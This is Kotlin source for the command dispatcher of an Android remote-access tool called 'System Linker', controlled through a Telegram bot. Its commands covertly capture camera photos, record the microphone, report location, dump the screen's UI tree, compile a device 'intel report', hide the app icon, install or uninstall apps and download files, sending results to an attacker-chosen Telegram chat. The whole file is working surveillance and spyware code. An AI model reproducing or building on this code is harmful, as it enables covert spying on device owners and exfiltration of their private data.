package com.systemlinker.features

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import com.systemlinker.base.ConfigStore
import com.systemlinker.base.ErrorLogger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import org.json.JSONObject
import java.io.File
import kotlin.coroutines.resume

class CommandProcessor(
    private val context: Context,
    private val defaultBotToken: String,
    private val defaultChatId: Long
) {
    private val configStore = ConfigStore(context)
    private val uploader = TelegramUploader(context, configStore.botToken, configStore.targetChatId)
    private val liveSessionManager = LiveSessionManager(context)
    private val mediaHandler = MediaHandler(context)
    private val systemHandler = SystemHandler(context)
    private val workflowEngine = WorkflowEngine(context, uploader, systemHandler, mediaHandler)
    private val processorScope = CoroutineScope(Dispatchers.IO)

    fun execute(payload: JSONObject) {
        val cmd = payload.optString("cmd", "")
        val arg = payload.optString("arg", "")

        uploader.botToken = configStore.botToken
        uploader.chatId = configStore.targetChatId

        processorScope.launch {
            try {
                when (cmd) {
                    "help" -> {
                        val type = arg.trim().lowercase()
                        if (type == "workflow") {
                            uploader.sendText("Generating Comprehensive Workflow Manual...")
                            val docFile = HelpGenerator.generateWorkflowHelp(context)
                            uploader.sendDocument(docFile, "📚 System Linker - Workflow Engine Guide\n\nTap the file to view perfectly formatted tables and code blocks. Use your device's native 'Copy' feature inside the document.", true)
                        } else {
                            uploader.sendText("Generating Command Reference Guide...")
                            val docFile = HelpGenerator.generateCommandHelp(context)
                            uploader.sendDocument(docFile, "🛠️ System Linker - Command Reference Guide\n\nTap the file to view perfectly formatted tables. Use your device's native 'Copy' feature inside the document.", true)
                        }
                    }
                    "set_bot_api" -> {
                        configStore.botToken = arg.trim()
                        uploader.botToken = configStore.botToken
                        uploader.sendText("✅ Bot API updated permanently.")
                    }
                    "set_target_chatid" -> {
                        configStore.targetChatId = arg.trim().toLongOrNull() ?: configStore.targetChatId
                        uploader.chatId = configStore.targetChatId
                        uploader.sendText("✅ Target Chat ID updated permanently.")
                    }
                    "set_overlay_duration" -> {
                        configStore.overlayDurationMs = arg.trim().toLongOrNull() ?: 3000L
                        uploader.sendText("Overlay duration set to ${configStore.overlayDurationMs}ms.")
                    }
                    "click_after_HS_switch" -> {
                        val parts = arg.split(",")
                        configStore.postHotspotAction = parts[0].trim()
                        configStore.postHotspotArgs = if (parts.size > 1) parts[1].trim().toIntOrNull() ?: 1 else 1
                        uploader.sendText("Post-Hotspot action set to: ${configStore.postHotspotAction} x${configStore.postHotspotArgs}")
                    }
                    "set_overlay" -> {
                        uploader.sendText("⏳ Polling for 30 seconds. Please send an IMAGE now to set as the persistent overlay...")
                        val destFile = File(context.filesDir, "stealth_overlay.jpg")
                        val success = uploader.pollForFile(30, "photo", destFile)
                        if (success) uploader.sendText("✅ Overlay image received and saved successfully.")
                        else uploader.sendText("❌ Timeout. No image received.")
                    }

                    "workflow" -> {
                        val wfName = arg.trim().ifBlank { "default_flow" }
                        uploader.sendText("⏳ Polling for 30s Please send a DOCUMENT (YML/TXT) for workflow: $wfName...")
                        val destFile = File(context.filesDir, "$wfName.yml")
                        val success = uploader.pollForFile(30, "document", destFile)
                        if (success) {
                            uploader.sendText("✅ Workflow '$wfName' received. Executing...")
                            workflowEngine.executeWorkflow(wfName)
                        } else {
                            uploader.sendText("❌ Timeout. No workflow document received.")
                        }
                    }
                    "status_workflow" -> {
                        val wfName = arg.trim().ifBlank { "default_flow" }
                        workflowEngine.sendStatus(wfName)
                    }

                    // --- NEW STANDALONE SCREEN DUMP COMMAND ---
                    "dump_screen" -> {
                        uploader.sendText("Extracting UI DOM Tree...")
                        val dumpFile = suspendCancellableCoroutine<File?> { cont ->
                            val receiver = object : BroadcastReceiver() {
                                override fun onReceive(c: Context?, intent: Intent?) {
                                    if (intent?.action == "com.systemlinker.UI_RESULT") {
                                        context.unregisterReceiver(this)
                                        val msg = intent.getStringExtra("result") ?: ""
                                        if (msg.contains("SUCCESS")) {
                                            if (cont.isActive) cont.resume(File(context.filesDir, "ui_debug_dump.txt"))
                                        } else {
                                            if (cont.isActive) cont.resume(null)
                                        }
                                    }
                                }
                            }
                            val filter = IntentFilter("com.systemlinker.UI_RESULT")
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
                            } else {
                                context.registerReceiver(receiver, filter)
                            }
                            val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                                setPackage(context.packageName)
                                putExtra("action", "dump_screen_request")
                            }
                            context.sendBroadcast(intent)
                        }
                        
                        if (dumpFile != null && dumpFile.exists()) {
                            uploader.sendDocument(dumpFile, "Standalone UI Debug Dump", true)
                        } else {
                            uploader.sendText("Failed to generate UI dump.")
                        }
                    }

                    "ping" -> uploader.sendText("🟢 Device Online\n${systemHandler.getBasicBatteryStatus()}")
                    "cam_front" -> mediaHandler.takePicture(isFront = true)?.let { uploader.sendFile(it, "photo", "Front Camera") }
                    "cam_back" -> mediaHandler.takePicture(isFront = false)?.let { uploader.sendFile(it, "photo", "Back Camera") }
                    "mic" -> mediaHandler.recordAudio(arg.toIntOrNull() ?: 15)?.let { uploader.sendFile(it, "audio", "Mic Record") }
                    "loc" -> uploader.sendText(systemHandler.getLocation())
                    "flash" -> uploader.sendText(systemHandler.setFlashlight(arg == "on"))
                    "vol" -> systemHandler.setVolume(arg.toIntOrNull() ?: 50)
                    "info" -> uploader.sendDocument(systemHandler.generateFullSystemReport(), "Full Device Intel Report", true)
                    "get_log" -> uploader.sendDocument(ErrorLogger.getLogFile(context), "SystemLinker Error Logs")
                    "clear_log" -> ErrorLogger.clearLogs(context)
                    "live_start" -> liveSessionManager.connect(arg.trim())
                    "live_stop" -> liveSessionManager.disconnect()
                    "install_app" -> systemHandler.installApp(arg)
                    "uninstall_app" -> systemHandler.uninstallApp(arg)
                    "icon_hide" -> uploader.sendText(systemHandler.setAppIconVisibility(false))
                    "icon_show" -> uploader.sendText(systemHandler.setAppIconVisibility(true))
                    "toggle_wifi" -> uploader.sendText(systemHandler.setWifiState(arg == "on"))
                    "toggle_bt" -> uploader.sendText(systemHandler.setBluetoothState(arg == "on"))
                    "toggle_hotspot" -> uploader.sendText(systemHandler.setHotspotState(arg == "on"))
                    "scan_wifi" -> uploader.sendText(systemHandler.getWifiScanResults())
                    "scan_bt" -> uploader.sendText(systemHandler.getBluetoothScanResults())
                    "download_url" -> {
                        try {
                            val json = JSONObject(arg)
                            uploader.sendText(systemHandler.downloadFileFromUrl(json.optString("url"), json.optString("path", "")))
                        } catch (e: Exception) { }
                    }
                }
            } catch (e: Exception) {
                ErrorLogger.logError(context, "CommandExecute_${cmd}", e)
                uploader.sendText("Execution failed for command: $cmd")
            }
        }
    }
}